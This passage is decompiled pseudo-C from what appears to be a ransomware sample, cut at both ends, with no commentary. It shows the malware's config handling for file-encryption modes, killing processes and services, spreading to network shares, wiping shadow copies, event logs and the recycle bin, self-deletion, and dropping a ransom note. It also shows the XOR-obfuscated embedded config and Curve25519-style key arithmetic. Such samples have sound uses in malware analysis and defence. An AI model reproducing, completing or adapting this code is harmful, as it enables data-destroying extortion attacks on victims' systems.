  int v25; // esi
  _DWORD *v26; // eax
  _DWORD *v27; // edi
  int v28; // eax
  int v29; // ecx
  _DWORD *v30; // eax
  _DWORD *v31; // eax
  _DWORD *v32; // eax
  _DWORD *v33; // eax
  _DWORD *v34; // eax
  _DWORD *v35; // eax
  _DWORD *v36; // eax
  _DWORD *v37; // eax
  _DWORD *v38; // eax
  _DWORD *v39; // eax
  _DWORD *v40; // eax
  _DWORD *v41; // eax
  _DWORD *v42; // eax
  _DWORD *v43; // eax
  _DWORD *v44; // eax
  _DWORD *v45; // eax
  _DWORD *v46; // eax
  _DWORD *v47; // eax
  _DWORD *v48; // eax
  _DWORD *v49; // eax
  _DWORD *v50; // eax
  _DWORD *v51; // eax
  _DWORD *v52; // eax
  _DWORD *v53; // eax
  _DWORD *v54; // eax
  _DWORD *v55; // eax
  _DWORD *v56; // esi
  _DWORD *v57; // eax
  PWSTR (__stdcall *v58)(PCWSTR, PCWSTR, WCHAR); // edi
  WCHAR *v59; // eax
  PWSTR i; // eax
  _DWORD *v61; // eax
  WCHAR *v62; // eax
  PWSTR j; // eax
  _DWORD *v64; // eax
  WCHAR *v65; // eax
  PWSTR k; // eax
  _DWORD *v67; // eax
  WCHAR *v68; // eax
  PWSTR m; // eax
  _DWORD *v70; // eax
  WCHAR *v71; // eax
  PWSTR n; // eax
  _DWORD *v73; // eax
  WCHAR *v74; // eax
  PWSTR ii; // eax
  _DWORD *v76; // eax
  WCHAR *v77; // eax
  PWSTR jj; // eax
  _DWORD *v79; // eax
  SIZE_T v80; // edi
  CHAR *kk; // eax
  const WCHAR *v82; // [esp-Ch] [ebp-2Ch]
  const WCHAR *v83; // [esp-Ch] [ebp-2Ch]
  const WCHAR *v84; // [esp-Ch] [ebp-2Ch]
  const WCHAR *v85; // [esp-Ch] [ebp-2Ch]
  const WCHAR *v86; // [esp-Ch] [ebp-2Ch]
  const WCHAR *v87; // [esp-Ch] [ebp-2Ch]
  const WCHAR *v88; // [esp-Ch] [ebp-2Ch]
  int v89; // [esp-8h] [ebp-28h]
  int v90; // [esp-4h] [ebp-24h]
  const CHAR *lpMultiByteStr; // [esp+Ch] [ebp-14h]
  LPCCH lpMultiByteStra; // [esp+Ch] [ebp-14h]
  LPCCH lpMultiByteStrb; // [esp+Ch] [ebp-14h]
  LPCCH lpMultiByteStrc; // [esp+Ch] [ebp-14h]
  LPCCH lpMultiByteStrd; // [esp+Ch] [ebp-14h]
  LPCCH lpMultiByteStre; // [esp+Ch] [ebp-14h]
  LPCCH lpMultiByteStrf; // [esp+Ch] [ebp-14h]
  const CHAR *lpMultiByteStrg; // [esp+Ch] [ebp-14h]
  int cchWideChar; // [esp+10h] [ebp-10h]
  int cchWideChara; // [esp+10h] [ebp-10h]
  int cchWideCharb; // [esp+10h] [ebp-10h]
  int cchWideCharc; // [esp+10h] [ebp-10h]
  int cchWideChard; // [esp+10h] [ebp-10h]
  int cchWideChare; // [esp+10h] [ebp-10h]
  int cchWideCharf; // [esp+10h] [ebp-10h]
  int dwBytes; // [esp+14h] [ebp-Ch]
  const CHAR *dwBytesa; // [esp+14h] [ebp-Ch]
  const CHAR *dwBytesb; // [esp+14h] [ebp-Ch]
  const CHAR *dwBytesc; // [esp+14h] [ebp-Ch]
  const CHAR *dwBytesd; // [esp+14h] [ebp-Ch]
  const CHAR *dwBytese; // [esp+14h] [ebp-Ch]
  const CHAR *dwBytesf; // [esp+14h] [ebp-Ch]
  _DWORD *v113; // [esp+18h] [ebp-8h]
  _DWORD *v114; // [esp+1Ch] [ebp-4h]
  int v115; // [esp+1Ch] [ebp-4h]

  v3 = sub_404040(a1, a2, a3, v89, v90);
  v113 = v3;
  if ( v3 )
  {
    v4 = sub_404720((int)v3, "bot");
    v5 = (int)v4;
    v114 = v4;
    if ( v4 )
    {
      v6 = sub_404720((int)v4, "key");
      if ( v6 )
      {
        v7 = (unsigned __int8 *)v6[4];
        v8 = v7;
        do
          v9 = *v8++;
        while ( (unsigned __int8)byte_42A170[v9] <= 0x3Fu );
        v10 = &unk_430918;
        v11 = v8 - v7 - 1;
        if ( v11 > 4 )
        {
          v12 = ((unsigned int)(v11 - 5) >> 2) + 1;
          v11 -= 4 * v12;
          do
          {
            *v10 = (4 * byte_42A170[*v7]) | ((unsigned __int8)byte_42A170[v7[1]] >> 4);
            v10[1] = ((unsigned __int8)byte_42A170[v7[2]] >> 2) | (16 * byte_42A170[v7[1]]);
            v13 = v7[2];
            v14 = v7[3];
            v7 += 4;
            v10[2] = byte_42A170[v14] | (byte_42A170[v13] << 6);
            v10 += 3;
            --v12;
          }
          while ( v12 );
          v5 = (int)v114;
        }
        if ( v11 > 1 )
          *v10++ = (4 * byte_42A170[*v7]) | ((unsigned __int8)byte_42A170[v7[1]] >> 4);
        if ( v11 > 2 )
          *v10++ = (16 * byte_42A170[v7[1]]) | ((unsigned __int8)byte_42A170[v7[2]] >> 2);
        if ( v11 > 3 )
          *v10++ = byte_42A170[v7[3]] | (byte_42A170[v7[2]] << 6);
        *v10 = 0;
      }
      v15 = sub_404720(v5, "uid");
      if ( v15 )
      {
        v16 = (char *)v15[4];
        v17 = (char *)&unk_430840;
        do
        {
          v18 = *v16;
          ++v17;
          ++v16;
          *(v17 - 1) = v18;
        }
        while ( v18 );
      }
      v19 = sub_404720(v5, "aid");
      if ( v19 )
      {
        v20 = (char *)v19[4];
        v21 = (char *)&unk_430948;
        do
        {
          v22 = *v20;
          ++v21;
          ++v20;
          *(v21 - 1) = v22;
        }
        while ( v22 );
      }
    }
    v23 = sub_404720((int)v113, "config");
    v115 = (int)v23;
    if ( v23 )
    {
      v24 = sub_404720((int)v23, "settings");
      v25 = (int)v24;
      if ( v24 )
      {
        v26 = sub_404720((int)v24, "encrypt_mode");
        v27 = v26;
        if ( v26 )
        {
          if ( lstrcmpiA((LPCSTR)v26[4], "auto") )
          {
            if ( lstrcmpiA((LPCSTR)v27[4], "full") )
            {
              if ( lstrcmpiA((LPCSTR)v27[4], "header") )
              {
                if ( lstrcmpiA((LPCSTR)v27[4], "split") )
                {
                  v28 = lstrcmpiA((LPCSTR)v27[4], "custom");
                  v29 = dword_43093C;
                  if ( !v28 )
                    v29 = 4;
                  dword_43093C = v29;
                }
                else
                {
                  dword_43093C = 1;
                }
              }
              else
              {
                dword_43093C = 2;
              }
            }
            else
            {
              dword_43093C = 0;
            }
          }
          else
          {
            dword_43093C = 3;
          }
        }
        v30 = sub_404720(v25, "split_size");
        if ( v30 )
          dword_4309D4 = v30[5];
        v31 = sub_404720(v25, "encrypt_filename");
        if ( v31 )
          dword_4308F0 = v31[5];
        v32 = sub_404720(v25, "encrypt_priority");
        if ( v32 )
          dword_4308D0 = v32[5];
        v33 = sub_404720(v25, "ntfs_search");
        if ( v33 )
          dword_4308E0 = v33[5];
        v34 = sub_404720(v25, "impersonation");
        if ( v34 )
          dword_4309DC = v34[5];
        v35 = sub_404720(v25, "mount_hidden_volumes");
        if ( v35 )
          dword_430908 = v35[5];
        v36 = sub_404720(v25, "skip_hidden_folders");
        if ( v36 )
          dword_430938 = v36[5];
        v37 = sub_404720(v25, "local_drives");
        if ( v37 )
          dword_4308F8 = v37[5];
        v38 = sub_404720(v25, "network_drives");
        if ( v38 )
          dword_4308DC = v38[5];
        v39 = sub_404720(v25, "network_shares");
        if ( v39 )
          dword_43090C = v39[5];
        v40 = sub_404720(v25, "kill_processes");
        if ( v40 )
          dword_4309E0 = v40[5];
        v41 = sub_404720(v25, "kill_services");
        if ( v41 )
          dword_4308E4 = v41[5];
        v42 = sub_404720(v25, "running_one");
        if ( v42 )
          dword_4309D0 = v42[5];
        v43 = sub_404720(v25, "setup_autorun");
        if ( v43 )
          dword_430910 = v43[5];
        v44 = sub_404720(v25, "print_note");
        if ( v44 )
          dword_4308EC = v44[5];
        v45 = sub_404720(v25, "set_wallpaper");
        if ( v45 )
          dword_430940 = v45[5];
        v46 = sub_404720(v25, "set_icon");
        if ( v46 )
          dword_4309CC = v46[5];
        v47 = sub_404720(v25, "set_logon_message");
        if ( v47 )
          dword_4309D8 = v47[5];
        v48 = sub_404720(v25, "send_report");
        if ( v48 )
          dword_4308D4 = v48[5];
        v49 = sub_404720(v25, "self_destruct");
        if ( v49 )
          dword_430904 = v49[5];
        v50 = sub_404720(v25, "wipe_freespace");
        if ( v50 )
          dword_4308CC = v50[5];
        v51 = sub_404720(v25, "wipe_shadowcopy");
        if ( v51 )
          dword_4308F4 = v51[5];
        v52 = sub_404720(v25, "wipe_recyclebin");
        if ( v52 )
          dword_4308FC = v52[5];
        v53 = sub_404720(v25, "wipe_eventlogs");
        if ( v53 )
          dword_4309C8 = v53[5];
        v54 = sub_404720(v25, "debug_mode");
        if ( v54 )
          dword_4308D8 = v54[5];
        v55 = sub_404720(v25, "power");
        v56 = v55;
        if ( v55 )
        {
          if ( lstrcmpiA((LPCSTR)v55[4], "reboot") )
            Action = lstrcmpiA((LPCSTR)v56[4], "shutdown") != 0 ? ShutdownNoReboot : ShutdownPowerOff;
          else
            Action = ShutdownReboot;
        }
      }
      v57 = sub_404720(v115, "white_folders");
      v58 = StrRChrW;
      if ( v57 )
      {
        lpMultiByteStr = (const CHAR *)v57[4];
        cchWideChar = MultiByteToWideChar(0xFDE9u, 0, lpMultiByteStr, -1, 0, 0);
        dwBytes = 2 * cchWideChar + 2;
        v59 = (WCHAR *)HeapAlloc(hHeap, 8u, dwBytes);
        if ( !v59 )
        {
          do
          {
            Sleep(0x64u);
            v59 = (WCHAR *)HeapAlloc(hHeap, 8u, dwBytes);
          }
          while ( !v59 );
          v58 = StrRChrW;
        }
        lpMem = v59;
        MultiByteToWideChar(0xFDE9u, 0, lpMultiByteStr, -1, v59, cchWideChar);
        for ( i = v58(lpMem, 0, 0x3Bu); i; i = v58(v82, 0, 0x3Bu) )
        {
          v82 = lpMem;
          *i = 0;
        }
      }
      v61 = sub_404720(v115, "white_files");
      if ( v61 )
      {
        dwBytesa = (const CHAR *)v61[4];
        cchWideChara = MultiByteToWideChar(0xFDE9u, 0, dwBytesa, -1, 0, 0);
        lpMultiByteStra = (LPCCH)(2 * cchWideChara + 2);
        v62 = (WCHAR *)HeapAlloc(hHeap, 8u, (SIZE_T)lpMultiByteStra);
        if ( !v62 )
        {
          do
          {
            Sleep(0x64u);
            v62 = (WCHAR *)HeapAlloc(hHeap, 8u, (SIZE_T)lpMultiByteStra);
          }
          while ( !v62 );
          v58 = StrRChrW;
        }
        lpString2 = v62;
        MultiByteToWideChar(0xFDE9u, 0, dwBytesa, -1, v62, cchWideChara);
        for ( j = v58(lpString2, 0, 0x3Bu); j; j = v58(v83, 0, 0x3Bu) )
        {
          v83 = lpString2;
          *j = 0;
        }
      }
      v64 = sub_404720(v115, "white_extensions");
      if ( v64 )
      {
        dwBytesb = (const CHAR *)v64[4];
        cchWideCharb = MultiByteToWideChar(0xFDE9u, 0, dwBytesb, -1, 0, 0);
        lpMultiByteStrb = (LPCCH)(2 * cchWideCharb + 2);
        v65 = (WCHAR *)HeapAlloc(hHeap, 8u, (SIZE_T)lpMultiByteStrb);
        if ( !v65 )
        {
          do
          {
            Sleep(0x64u);
            v65 = (WCHAR *)HeapAlloc(hHeap, 8u, (SIZE_T)lpMultiByteStrb);
          }
          while ( !v65 );
          v58 = StrRChrW;
        }
        dword_430914 = v65;
        MultiByteToWideChar(0xFDE9u, 0, dwBytesb, -1, v65, cchWideCharb);
        for ( k = v58(dword_430914, 0, 0x3Bu); k; k = v58(v84, 0, 0x3Bu) )
        {
          v84 = dword_430914;
          *k = 0;
        }
      }
      v67 = sub_404720(v115, "large_extensions");
      if ( v67 )
      {
        dwBytesc = (const CHAR *)v67[4];
        cchWideCharc = MultiByteToWideChar(0xFDE9u, 0, dwBytesc, -1, 0, 0);
        lpMultiByteStrc = (LPCCH)(2 * cchWideCharc + 2);
        v68 = (WCHAR *)HeapAlloc(hHeap, 8u, (SIZE_T)lpMultiByteStrc);
        if ( !v68 )
        {
          do
          {
            Sleep(0x64u);
            v68 = (WCHAR *)HeapAlloc(hHeap, 8u, (SIZE_T)lpMultiByteStrc);
          }
          while ( !v68 );
          v58 = StrRChrW;
        }
        dword_4309E4 = v68;
        MultiByteToWideChar(0xFDE9u, 0, dwBytesc, -1, v68, cchWideCharc);
        for ( m = v58(dword_4309E4, 0, 0x3Bu); m; m = v58(v85, 0, 0x3Bu) )
        {
          v85 = dword_4309E4;
          *m = 0;
        }
      }
      v70 = sub_404720(v115, "white_processes");
      if ( v70 )
      {
        dwBytesd = (const CHAR *)v70[4];
        cchWideChard = MultiByteToWideChar(0xFDE9u, 0, dwBytesd, -1, 0, 0);
        lpMultiByteStrd = (LPCCH)(2 * cchWideChard + 2);
        v71 = (WCHAR *)HeapAlloc(hHeap, 8u, (SIZE_T)lpMultiByteStrd);
        if ( !v71 )
        {
          do
          {
            Sleep(0x64u);
            v71 = (WCHAR *)HeapAlloc(hHeap, 8u, (SIZE_T)lpMultiByteStrd);
          }
          while ( !v71 );
          v58 = StrRChrW;
        }
        pszSrch = v71;
        MultiByteToWideChar(0xFDE9u, 0, dwBytesd, -1, v71, cchWideChard);
        for ( n = v58(pszSrch, 0, 0x3Bu); n; n = v58(v86, 0, 0x3Bu) )
        {
          v86 = pszSrch;
          *n = 0;
        }
      }
      v73 = sub_404720(v115, "kill_processes");
      if ( v73 )
      {
        dwBytese = (const CHAR *)v73[4];
        cchWideChare = MultiByteToWideChar(0xFDE9u, 0, dwBytese, -1, 0, 0);
        lpMultiByteStre = (LPCCH)(2 * cchWideChare + 2);
        v74 = (WCHAR *)HeapAlloc(hHeap, 8u, (SIZE_T)lpMultiByteStre);
        if ( !v74 )
        {
          do
          {
            Sleep(0x64u);
            v74 = (WCHAR *)HeapAlloc(hHeap, 8u, (SIZE_T)lpMultiByteStre);
          }
          while ( !v74 );
          v58 = StrRChrW;
        }
        lpString = v74;
        MultiByteToWideChar(0xFDE9u, 0, dwBytese, -1, v74, cchWideChare);
        for ( ii = v58(lpString, 0, 0x3Bu); ii; ii = v58(v87, 0, 0x3Bu) )
        {
          v87 = lpString;
          *ii = 0;
        }
      }
      v76 = sub_404720(v115, "kill_services");
      if ( v76 )
      {
        dwBytesf = (const CHAR *)v76[4];
        cchWideCharf = MultiByteToWideChar(0xFDE9u, 0, dwBytesf, -1, 0, 0);
        lpMultiByteStrf = (LPCCH)(2 * cchWideCharf + 2);
        v77 = (WCHAR *)HeapAlloc(hHeap, 8u, (SIZE_T)lpMultiByteStrf);
        if ( !v77 )
        {
          do
          {
            Sleep(0x64u);
            v77 = (WCHAR *)HeapAlloc(hHeap, 8u, (SIZE_T)lpMultiByteStrf);
          }
          while ( !v77 );
          v58 = StrRChrW;
        }
        lpServiceName = v77;
        MultiByteToWideChar(0xFDE9u, 0, dwBytesf, -1, v77, cchWideCharf);
        for ( jj = v58(lpServiceName, 0, 0x3Bu); jj; jj = v58(v88, 0, 0x3Bu) )
        {
          v88 = lpServiceName;
          *jj = 0;
        }
      }
      v79 = sub_404720(v115, "note");
      if ( v79 )
      {
        lpMultiByteStrg = (const CHAR *)v79[4];
        v80 = lstrlenA(lpMultiByteStrg) + 1024;
        for ( kk = (CHAR *)HeapAlloc(hHeap, 8u, v80); !kk; kk = (CHAR *)HeapAlloc(hHeap, 8u, v80) )
          Sleep(0x64u);
        pBuf = kk;
        sub_401240((int *)kk, (int)lpMultiByteStrg, (int)&unk_430840);
      }
    }
    sub_403C00(v113);
  }
}
// 4047EC: variable 'v89' is possibly undefined
// 4047EC: variable 'v90' is possibly undefined
// 4308CC: using guessed type int dword_4308CC;
// 4308D0: using guessed type int dword_4308D0;
// 4308D4: using guessed type int dword_4308D4;
// 4308D8: using guessed type int dword_4308D8;
// 4308DC: using guessed type int dword_4308DC;
// 4308E0: using guessed type int dword_4308E0;
// 4308E4: using guessed type int dword_4308E4;
// 4308EC: using guessed type int dword_4308EC;
// 4308F0: using guessed type int dword_4308F0;
// 4308F4: using guessed type int dword_4308F4;
// 4308F8: using guessed type int dword_4308F8;
// 4308FC: using guessed type int dword_4308FC;
// 430904: using guessed type int dword_430904;
// 430908: using guessed type int dword_430908;
// 43090C: using guessed type int dword_43090C;
// 430910: using guessed type int dword_430910;
// 430938: using guessed type int dword_430938;
// 43093C: using guessed type int dword_43093C;
// 430940: using guessed type int dword_430940;
// 4309C8: using guessed type int dword_4309C8;
// 4309CC: using guessed type int dword_4309CC;
// 4309D0: using guessed type int dword_4309D0;
// 4309D4: using guessed type int dword_4309D4;
// 4309D8: using guessed type int dword_4309D8;
// 4309DC: using guessed type int dword_4309DC;
// 4309E0: using guessed type int dword_4309E0;

//----- (004052D0) --------------------------------------------------------
LPCSTR sub_4052D0()
{
  LPCSTR result; // eax

  if ( lpMem )
    HeapFree(hHeap, 0, (LPVOID)lpMem);
  if ( lpString2 )
    HeapFree(hHeap, 0, (LPVOID)lpString2);
  if ( dword_430914 )
    HeapFree(hHeap, 0, (LPVOID)dword_430914);
  if ( dword_4309E4 )
    HeapFree(hHeap, 0, (LPVOID)dword_4309E4);
  if ( pszSrch )
    HeapFree(hHeap, 0, (LPVOID)pszSrch);
  if ( lpString )
    HeapFree(hHeap, 0, (LPVOID)lpString);
  if ( lpServiceName )
    HeapFree(hHeap, 0, (LPVOID)lpServiceName);
  result = pBuf;
  if ( pBuf )
    return (LPCSTR)HeapFree(hHeap, 0, (LPVOID)pBuf);
  return result;
}

//----- (00405380) --------------------------------------------------------
BOOL __usercall sub_405380@<eax>(double a1@<st0>)
{
  HRSRC ResourceW; // esi
  DWORD v2; // edi
  HGLOBAL Resource; // eax
  char *i; // esi
  DWORD v5; // ecx
  unsigned int j; // edx
  char *v7; // eax
  void *Src; // [esp+Ch] [ebp-4h]

  ResourceW = FindResourceW(0, (LPCWSTR)0x65, (LPCWSTR)0xA);
  v2 = SizeofResource(0, ResourceW);
  Resource = LoadResource(0, ResourceW);
  Src = LockResource(Resource);
  for ( i = (char *)HeapAlloc(hHeap, 8u, v2); !i; i = (char *)HeapAlloc(hHeap, 8u, v2) )
    Sleep(0x64u);
  memmove(i, Src, v2);
  v5 = 0;
  for ( j = 1651; v5 < v2; *v7 ^= j )
  {
    j = (2147483629 * j + 2147483587) % 0x7FFFFFFF;
    v7 = &i[v5++];
  }
  sub_4047E0(v2, i, a1);
  return HeapFree(hHeap, 0, i);
}

//----- (00405450) --------------------------------------------------------
int __thiscall sub_405450(unsigned __int8 *this)
{
  int v2; // edi
  unsigned int v3; // eax
  int v4; // edx
  unsigned int v5; // eax
  unsigned int v6; // edx
  unsigned int v7; // ecx
  unsigned int v8; // edx
  unsigned int v9; // ecx
  unsigned int v10; // edx
  unsigned int v11; // ecx
  unsigned int v12; // edx

  v2 = 32;
  v3 = -1;
  do
  {
    v4 = *this++;
    v5 = v4 ^ v3;
    v6 = (v5 >> 1) ^ 0x82F63B78;
    if ( (v5 & 1) == 0 )
      v6 = v5 >> 1;
    v7 = (v6 >> 1) ^ 0x82F63B78;
    if ( (v6 & 1) == 0 )
      v7 = v6 >> 1;
    v8 = (v7 >> 1) ^ 0x82F63B78;
    if ( (v7 & 1) == 0 )
      v8 = v7 >> 1;
    v9 = (v8 >> 1) ^ 0x82F63B78;
    if ( (v8 & 1) == 0 )
      v9 = v8 >> 1;
    v10 = (v9 >> 1) ^ 0x82F63B78;
    if ( (v9 & 1) == 0 )
      v10 = v9 >> 1;
    v11 = (v10 >> 1) ^ 0x82F63B78;
    if ( (v10 & 1) == 0 )
      v11 = v10 >> 1;
    v12 = (v11 >> 1) ^ 0x82F63B78;
    if ( (v11 & 1) == 0 )
      v12 = v11 >> 1;
    v3 = (v12 >> 1) ^ 0x82F63B78;
    if ( (v12 & 1) == 0 )
      v3 = v12 >> 1;
    --v2;
  }
  while ( v2 );
  return ~v3;
}

//----- (00405510) --------------------------------------------------------
__int64 __usercall sub_405510@<edx:eax>(int *a1@<edx>, _QWORD *a2@<ecx>, int *a3)
{
  __int64 result; // rax

  *a2 = *a3 * (__int64)*a1;
  a2[1] = a3[2] * (__int64)*a1 + *a3 * (__int64)a1[2];
  a2[2] = *a3 * (__int64)a1[4] + a3[4] * (__int64)*a1 + 2 * a3[2] * (__int64)a1[2];
  a2[3] = *a3 * (__int64)a1[6] + a3[2] * (__int64)a1[4] + a3[4] * (__int64)a1[2] + a3[6] * (__int64)*a1;
  a2[4] = a3[8] * (__int64)*a1
        + *a3 * (__int64)a1[8]
        + a3[4] * (__int64)a1[4]
        + 2 * (a3[6] * (__int64)a1[2] + a3[2] * (__int64)a1[6]);
  a2[5] = a3[6] * (__int64)a1[4]
        + *a3 * (__int64)a1[10]
        + a3[2] * (__int64)a1[8]
        + a3[4] * (__int64)a1[6]
        + a3[8] * (__int64)a1[2]
        + a3[10] * (__int64)*a1;
  a2[6] = a3[8] * (__int64)a1[4]
        + *a3 * (__int64)a1[12]
        + a3[12] * (__int64)*a1
        + a3[4] * (__int64)a1[8]
        + 2 * (a3[10] * (__int64)a1[2] + a3[2] * (__int64)a1[10] + a3[6] * (__int64)a1[6]);
  a2[7] = *a3 * (__int64)a1[14]
        + a3[12] * (__int64)a1[2]
        + a3[14] * (__int64)*a1
        + a3[6] * (__int64)a1[8]
        + a3[2] * (__int64)a1[12]
        + a3[4] * (__int64)a1[10]
        + a3[10] * (__int64)a1[4]
        + a3[8] * (__int64)a1[6];
  a2[8] = *a3 * (__int64)a1[16]
        + a3[4] * (__int64)a1[12]
        + a3[16] * (__int64)*a1
        + a3[8] * (__int64)a1[8]
        + a3[12] * (__int64)a1[4]
        + 2 * (a3[6] * (__int64)a1[10] + a3[10] * (__int64)a1[6] + a3[14] * (__int64)a1[2] + a3[2] * (__int64)a1[14]);
  a2[9] = a3[8] * (__int64)a1[10]
        + a3[14] * (__int64)a1[4]
        + a3[4] * (__int64)a1[14]
        + a3[12] * (__int64)a1[6]
        + a3[6] * (__int64)a1[12]
        + a3[16] * (__int64)a1[2]
        + *a3 * (__int64)a1[18]
        + a3[18] * (__int64)*a1
        + a3[2] * (__int64)a1[16]
        + a3[10] * (__int64)a1[8];
  a2[10] = a3[16] * (__int64)a1[4]
         + a3[4] * (__int64)a1[16]
         + a3[8] * (__int64)a1[12]
         + a3[12] * (__int64)a1[8]
         + 2
         * (a3[18] * (__int64)a1[2]
          + a3[10] * (__int64)a1[10]
          + a3[2] * (__int64)a1[18]
          + a3[6] * (__int64)a1[14]
          + a3[14] * (__int64)a1[6]);
  a2[11] = a3[4] * (__int64)a1[18]
         + a3[10] * (__int64)a1[12]
         + a3[14] * (__int64)a1[8]
         + a3[12] * (__int64)a1[10]
         + a3[18] * (__int64)a1[4]
         + a3[6] * (__int64)a1[16]
         + a3[8] * (__int64)a1[14]
         + a3[16] * (__int64)a1[6];
  a2[12] = a3[12] * (__int64)a1[12]
         + a3[16] * (__int64)a1[8]
         + a3[8] * (__int64)a1[16]
         + 2 * (a3[14] * (__int64)a1[10] + a3[18] * (__int64)a1[6] + a3[10] * (__int64)a1[14] + a3[6] * (__int64)a1[18]);
  a2[13] = a3[16] * (__int64)a1[10]
         + a3[10] * (__int64)a1[16]
         + a3[12] * (__int64)a1[14]
         + a3[8] * (__int64)a1[18]
         + a3[14] * (__int64)a1[12]
         + a3[18] * (__int64)a1[8];
  a2[14] = a3[12] * (__int64)a1[16]
         + a3[16] * (__int64)a1[12]
         + 2 * (a3[10] * (__int64)a1[18] + a3[18] * (__int64)a1[10] + a3[14] * (__int64)a1[14]);
  a2[15] = a3[12] * (__int64)a1[18] + a3[18] * (__int64)a1[12] + a3[14] * (__int64)a1[16] + a3[16] * (__int64)a1[14];
  a2[16] = a3[16] * (__int64)a1[16] + 2 * (a3[18] * (__int64)a1[14] + a3[14] * (__int64)a1[18]);
  a2[17] = a3[18] * (__int64)a1[16] + a3[16] * (__int64)a1[18];
  result = 2 * a3[18] * (__int64)a1[18];
  a2[18] = result;
  return result;
}

//----- (004059E0) --------------------------------------------------------
__int64 __thiscall sub_4059E0(_QWORD *this)
{
  __int64 v1; // rax
  bool v2; // cf
  __int64 v3; // rax
  __int64 v4; // rax
  __int64 v5; // rax
  __int64 v6; // rax
  __int64 v7; // rax
  __int64 v8; // rax
  __int64 v9; // rax
  __int64 result; // rax

  v1 = 19i64 * this[18];
  v2 = __CFADD__((_DWORD)v1, *((_DWORD *)this + 16));
  *((_DWORD *)this + 16) += v1;
  *((_DWORD *)this + 17) += HIDWORD(v1) + v2;
  v3 = 19i64 * this[17];
  v2 = __CFADD__((_DWORD)v3, *((_DWORD *)this + 14));
  *((_DWORD *)this + 14) += v3;
  *((_DWORD *)this + 15) += HIDWORD(v3) + v2;
  v4 = 19i64 * this[16];
  v2 = __CFADD__((_DWORD)v4, *((_DWORD *)this + 12));
  *((_DWORD *)this + 12) += v4;
  *((_DWORD *)this + 13) += HIDWORD(v4) + v2;
  v5 = 19i64 * this[15];
  v2 = __CFADD__((_DWORD)v5, *((_DWORD *)this + 10));
  *((_DWORD *)this + 10) += v5;
  *((_DWORD *)this + 11) += HIDWORD(v5) + v2;
  v6 = 19i64 * this[14];
  v2 = __CFADD__((_DWORD)v6, *((_DWORD *)this + 8));
  *((_DWORD *)this + 8) += v6;
  *((_DWORD *)this + 9) += HIDWORD(v6) + v2;
  v7 = 19i64 * this[13];
  v2 = __CFADD__((_DWORD)v7, *((_DWORD *)this + 6));
  *((_DWORD *)this + 6) += v7;
  *((_DWORD *)this + 7) += HIDWORD(v7) + v2;
  v8 = 19i64 * this[12];
  v2 = __CFADD__((_DWORD)v8, *((_DWORD *)this + 4));
  *((_DWORD *)this + 4) += v8;
  *((_DWORD *)this + 5) += HIDWORD(v8) + v2;
  v9 = 19i64 * this[11];
  v2 = __CFADD__((_DWORD)v9, *((_DWORD *)this + 2));
  *((_DWORD *)this + 2) += v9;
  *((_DWORD *)this + 3) += HIDWORD(v9) + v2;
  result = 19i64 * this[10];
  *this += result;
  return result;
}

//----- (00405AC0) --------------------------------------------------------
int __thiscall sub_405AC0(_DWORD *this)
{
  _DWORD *v1; // esi
  int v2; // ebx
  unsigned int v3; // edi
  unsigned __int64 v4; // rax
  int v5; // ecx
  bool v6; // cf
  int v7; // edi
  unsigned int v8; // kr00_4
  int v9; // ebx
  signed __int64 v10; // kr18_8
  int v11; // edi
  unsigned __int64 v12; // kr20_8
  _DWORD *v13; // esi
  __int64 v14; // rax
  unsigned int v15; // kr04_4
  unsigned int v16; // kr28_4
  int v17; // edi
  unsigned __int64 v18; // rax
  unsigned int v19; // ecx
  int result; // eax
  unsigned int v22; // [esp+Ch] [ebp-Ch]
  int v23; // [esp+10h] [ebp-8h]

  v23 = 5;
  this[20] = 0;
  this[21] = 0;
  v1 = this + 2;
  do
  {
    v2 = *(v1 - 1);
    v3 = *(v1 - 2);
    v4 = *((_QWORD *)v1 - 1) / 0x4000000i64;
    v5 = v4 >> 6;
    LODWORD(v4) = (_DWORD)v4 << 26;
    v6 = v3 < (unsigned int)v4;
    v7 = v3 - v4;
    LODWORD(v4) = *((_QWORD *)v1 - 1) / 0x4000000i64;
    *(v1 - 2) = v7;
    v8 = *v1;
    *(v1 - 1) = v2 - (v6 + v5);
    v9 = (__PAIR64__(v1[1], v8) + v4) >> 32;
    LODWORD(v4) = v8 + v4;
    v10 = (unsigned int)v4 + __PAIR64__(v9, (unsigned int)(v9 >> 31) >> 7);
    v11 = (unsigned __int64)v10 >> 25;
    v12 = __PAIR64__(v9, v4) - (v10 >> 25 << 25);
    *v1 = v12;
    v6 = __CFADD__(v11, v1[2]);
    v1[2] += v11;
    v1[1] = HIDWORD(v12);
    v1[3] += (SHIDWORD(v10) >> 25) + v6;
    v1 += 4;
    --v23;
  }
  while ( v23 );
  v13 = this;
  v14 = 19i64 * *((_QWORD *)this + 10);
  this[20] = 0;
  v15 = *this;
  this[21] = 0;
  v16 = v15 + v14;
  LODWORD(v14) = (__PAIR64__(this[1], v15) + v14) >> 32;
  v22 = v14;
  v18 = __SPAIR64__(v14, v16) / 0x4000000;
  v17 = v18;
  v19 = v18 >> 6;
  LODWORD(v18) = (_DWORD)v18 << 26;
  *v13 = v16 - v18;
  result = (__PAIR64__(v22, v16) - __PAIR64__(v19, v18)) >> 32;
  v6 = __CFADD__(v17, v13[2]);
  v13[2] += v17;
  v13[3] += HIDWORD(v18) + v6;
  v13[1] = result;
  return result;
}

//----- (00405BD0) --------------------------------------------------------
__int64 __fastcall sub_405BD0(int a1, int *a2)
{
  int v4; // ebx
  int v5; // ecx
  int v6; // eax
  int v7; // edx
  int v8; // ecx
  __int64 v9; // kr118_8
  int v10; // edi
  __int64 result; // rax
  int v12; // [esp+Ch] [ebp-24h]
  int v13; // [esp+10h] [ebp-20h]
  int v14; // [esp+18h] [ebp-18h]
  int v15; // [esp+1Ch] [ebp-14h]
  int v16; // [esp+20h] [ebp-10h]
  int v17; // [esp+24h] [ebp-Ch]
  int v18; // [esp+28h] [ebp-8h]

  v4 = *a2;
  v5 = a2[2];
  *(_QWORD *)a1 = *a2 * (__int64)*a2;
  v6 = v5 * v4;
  v12 = v5;
  v7 = (unsigned __int64)(v5 * (__int64)v4) >> 31;
  v8 = a2[4];
  *(_DWORD *)(a1 + 12) = v7;
  *(_DWORD *)(a1 + 8) = 2 * v6;
  *(_QWORD *)(a1 + 16) = 2 * (a2[2] * (__int64)a2[2] + v8 * (__int64)v4);
  v14 = a2[6];
  *(_QWORD *)(a1 + 24) = 2 * (a2[4] * (__int64)a2[2] + v14 * (__int64)v4);
  v15 = a2[8];
  *(_QWORD *)(a1 + 32) = a2[4] * (__int64)a2[4] + 2 * (v15 * (__int64)v4 + 2 * a2[6] * (__int64)a2[2]);
  v16 = a2[10];
